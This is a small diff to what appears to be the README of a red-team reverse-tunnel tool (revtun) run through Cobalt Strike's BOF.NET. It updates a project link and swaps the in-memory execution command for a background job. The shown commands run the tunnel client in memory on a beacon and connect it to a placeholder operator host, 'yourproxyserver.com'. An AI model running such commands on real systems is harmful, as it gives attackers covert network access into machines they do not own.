@@ -65,7 +65,7 @@ execute-assembly revtun.exe relay --host [yourproxyserver.com]
 
 ### BOF.NET (in memory execution without creating new processes)
 #### Project
-- Original: https://github.com/williamknows/BOF.NET
+- Original: https://github.com/CCob/BOF.NET
 - Can run EXEs: https://github.com/williamknows/BOF.NET
 
 #### Requirements
@@ -94,8 +94,8 @@ bofnet_load /path/to/revtun.exe
 # (Optionally) list the loaded assemblies to check the name
 bofnet_listassemblies
 
-# Run the assembly. Note: the beacon will not call back after this.
-bofnet_executeassembly revtun client -h yourproxyserver.com --password testpass
+# Background execution
+bofnet_jobassembly revtun client -h yourproxyserver.com --password testpass
 ```
 
 #### Reference
